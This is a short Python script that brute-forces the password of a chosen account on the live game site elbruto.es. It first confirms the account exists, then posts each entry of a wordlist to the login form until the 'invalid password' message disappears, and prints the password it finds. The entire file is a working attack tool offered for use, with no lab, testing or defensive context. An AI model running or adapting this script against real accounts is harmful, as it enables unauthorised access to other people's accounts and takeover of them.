#!/usr/bin/python3
# Script by YoyoDavelion
import requests, os, sys, signal
def def_handler(sig, frame):
	print("\nExiting...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)
if len(sys.argv) != 3:
	print("Usage: %s (brutename) (wordlist)" %(sys.argv[0]))
	sys.exit(1)
r = requests.Session()
# Check if brute exists.
url = 'http://%s.elbruto.es/login' %(sys.argv[1])
checkbrute = r.get(url)
if "Puerta de la celda" not in checkbrute.text:
	print("The brute do not exist")
	sys.exit(1)
# Check if wordlist exists.
if str(os.path.exists(sys.argv[2])) == "False":
	print("That wordlist do not exist")
	sys.exit(1)
dic = open('%s' %(sys.argv[2]), 'r', encoding='utf-8')
tries = 0
for password in dic:
	password = password.replace("\n", "")
	print("Trying with password %s [Try nº%s]" %(password, tries))
	login_data = {'pass' : '%s' %(password), 'submit' : 'Entrar'}
	response = r.post(url, data=login_data)
	os.system('cls||clear')
	tries += 1
	if "Esta contraseña no es válida" not in response.text:
		print("The password is %s " %(password))
		sys.exit(0)
print("The password is not in the wordlist :(")
